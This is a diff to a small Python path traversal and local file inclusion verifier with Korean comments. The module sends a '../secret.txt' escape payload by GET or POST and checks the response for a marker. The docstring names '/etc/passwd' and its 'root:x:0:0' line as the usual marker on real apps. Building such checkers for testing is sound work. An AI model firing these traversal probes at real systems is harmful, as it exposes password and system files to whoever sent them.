@@ -7,9 +7,7 @@ Path Traversal / LFI 검증기 — 같은 결정론 철학, LLM 없음.
 표식(MARKER): 데모 과녁에선 웹루트 밖 secret.txt 의 "DB_PASSWORD".
              실제 앱에선 흔히 /etc/passwd 의 "root:x:0:0" 을 표식으로 쓴다.
 
-2026-08-25: fetch/verify 에 method="GET"|"POST" 인자 추가.
-GET 은 기존과 동일(쿼리스트링). POST 는 같은 payload 를 폼 바디로 보낸다.
-판정 로직(표식 발견 여부)은 요청 방식과 무관하게 동일 — 손 안 댐.
+GET/POST 둘 다 지원 — method 인자로 선택. 판정 로직은 요청 방식과 무관하게 동일.
 """
 import urllib.request
 import urllib.parse
@@ -19,18 +17,8 @@ MARKER = "DB_PASSWORD"
 
 
 def fetch(base_url, param, value, method="GET"):
-    """
-    (원본)
-    def fetch(base_url, param, value):
-        url = base_url + "?" + urllib.parse.urlencode({param: value})
-        try:
-            with urllib.request.urlopen(url, timeout=5) as r:
-                return r.status, r.read().decode("utf-8", "replace")
-        except urllib.error.HTTPError as e:
-            return e.code, e.read().decode("utf-8", "replace")
-    """
-    # (변경) method="GET"|"POST" 인자 추가. GET 은 기존과 동일(쿼리스트링).
-    #        POST 는 같은 payload 를 폼 바디로 보낸다. (param, value 순서 유지)
+    """base_url 에 payload 를 실어 요청. (상태코드, 본문) 반환.
+       GET: ?param=value. POST: form-urlencoded 바디."""
     if method.upper() == "POST":
         data = urllib.parse.urlencode({param: value}).encode("utf-8")
         req = urllib.request.Request(
@@ -47,14 +35,6 @@ def fetch(base_url, param, value, method="GET"):
 
 
 def verify(base_url, param="file", method="GET"):
-    """
-    (원본)
-    def verify(base_url, param="file"):
-        payload = "../secret.txt"
-        _, body = fetch(base_url, param, payload)
-        ev = {"payload": payload, "response": body}
-    """
-    # (변경) method 인자 추가 → fetch 로 그대로 전달. 아래 판정 로직은 원본과 동일.
     payload = "../secret.txt"                 # 웹루트 밖으로 한 단계 탈출
     _, body = fetch(base_url, param, payload, method)
     ev = {"method": method, "payload": payload, "response": body}
